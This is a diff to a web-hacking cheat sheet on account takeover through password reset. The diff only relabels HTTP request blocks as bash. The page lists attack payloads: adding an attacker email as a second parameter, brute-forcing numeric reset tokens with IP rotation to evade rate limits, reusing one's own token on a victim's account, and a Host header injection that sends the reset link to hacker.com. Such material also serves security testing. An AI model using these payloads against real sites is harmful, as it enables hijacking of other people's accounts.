@@ -13,14 +13,14 @@ tags: [web]
 - 1.) **Include your mail as a second parameter (you 
       might receive the reset link):**
     
-    ```http
+    ```bash
     POST /reset
     email=victim@tld.xyz&email=hacker@tld.xyz
     ```
     
 - 2) Brute force reset token if it is numeric. You can use IP Rotator on Burpsuite
     
-    ```http
+    ```bash
     to bypass rate limit in case it's IP based :
     
     POST /reset
@@ -29,14 +29,14 @@ tags: [web]
     
 - 3) Try to use your reset token on target's account
     
-    ```http
+    ```bash
     POST /reset
     email=victim@tld.xyz&code=$YOUR-TOKEN$
     ```
     
 - 4) Host header injection; change website.com to hacker.com (victim might receive the reset link with)
     
-    ```http
+    ```bash
     POST /reset
     Host: hacker.com[ … … . ].
     ```
